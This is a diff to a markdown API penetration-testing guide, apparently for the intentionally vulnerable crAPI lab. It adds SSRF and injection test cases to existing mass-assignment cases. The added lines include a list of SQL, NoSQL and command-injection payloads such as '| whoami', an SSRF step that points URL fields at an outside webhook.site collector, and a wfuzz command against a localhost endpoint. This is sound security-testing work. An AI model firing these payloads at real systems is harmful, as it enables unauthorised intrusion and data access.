@@ -231,7 +231,7 @@ wfuzz -d '{"email":"user@test.com", "otp":"FUZZ","password":"12345Qwert!"}' -H '
 >
 > ## TC#07 Testing Account Registration for Mass Assignment
 >
->> ### 'Testing Account Registration for Mass Assignment'
+>> ### 'Find the parameters where user assigns an admin permissions'
 >
 > Scope:
 >
@@ -267,9 +267,9 @@ Select Extensions > Param Miner > Guess params > Guess JSON parameter
 >
 > # Mass Assignment Attacks
 >
-> ## TC#08 Testing 
+> ## TC#08 User shouldn't be able to add own products 
 >
->> ### 'Testing products page for Mass Assignment'
+>> ### 'Testing "products" page for Mass Assignment'
 >
 > Scope:
 >
@@ -295,4 +295,117 @@ GET /workshop/api/shop/products
 > 1. User shouldn't be able to add own products
 > 
 ------------------------------------------------------------------------------------------
+>
+> # SSRF
+>
+> ## TC#08 'Server sanitize url value in request data' 
+>
+>> ### 'Testing requests for SSRF'
+>
+> Include full URLs in the POST body or parameters
+> Include URL paths (or partial URLs) in the POST body or parameters
+> Headers that include URLs like Referer
+>
+> Scope:
+>
+```
+POST /community/api/v2/community/posts
+POST /workshop/api/shop/orders/return_order?order_id=4000
+POST workshop/api/merchant/contact_mechanic
+```
+>
+>
+> Steps:
+>
+> 1. Intercept the request in Burp Suite
+> 2. Send to intruder
+> 3. Change the url values in requests with 'https://webhook.site/8d149a33-49a8-4ebe-926f-891d58294d8d'
+> 4. Check the response at `https://webhook.site'
+> 
+>
+> Expected result:
+> 
+> 1. User could replace data in request, server sanitize request from user
+> 
+------------------------------------------------------------------------------------------
+>
+> # Injection Attacks
+>
+> ## TC#08 'Server sanitize url and field value in request data' 
+>
+>> ### 'SQL, noSQL, Command Injection fuzzing'
+>
+> Test data:
+> sgl/nosql/command payload list:
+>
+```
+'
+''
+;%00
+-
+-- -
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+OR 1=1/*
+“or 1=1;%00
+OR 1=1
+admin"#
+admin' --
+admin" OR "1"="1
+{"$gt":""}
+{"$gt":-1}
+{"$ne":""}
+{"$ne":-1}
+$nin
+{"$nin":1}
+| whoami
+||
+&
+&&
+"
+;
+'"
+```
+>
+> Scope:
+>
+```
+GET /identity/api/v2/user/videos/{{video_id}}
+POST /workshop/api/shop/orders/return_order?order_id=4000
+POST workshop/api/merchant/contact_mechanic
+POST /identity/api/v2/user/change-email
+POST /identity/api/auth/v2/check-otp
+POST /workshop/api/shop/orders/return_order?order_id={{fuzz}}
+POST /community/api/{{ver}}/community/posts
+POST /community/api/{{ver}}/coupon/validate-coupon
+```
+>
+>
+> Steps:
+>
+> 1. Create duplicate postman collection for fuzzing
+> 2. Create 'fuzz' environment variable
+> 3. Assign payload from payload list to variable
+> 4. Run postman collection with each value
+> 5. In Burp Suite run Intruder - Sniper with payload list from test data
+> 6. Run wfuzz:
+```
+wfuzz -z file,/usr/share/wordlists/seclists/Fuzzing/nosql.txt  -H "Authorization: Bearer eyJhbGciOiJSUz....gDojE2FWg" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ}" http://127.0.0.1:8888/community/api/v2/coupon/validate-coupon
+``` 
+>
+>
+![Fuzzing for NoSql](/docs/injection/noSql_Fuzzing.png "NoSql_fuzzing screenshot") 
+>
+> Expected result:
+> 
+> 1. Server sanitizes url/field inputs from user
+> 
+------------------------------------------------------------------------------------------
+>
+
+
+
+
 
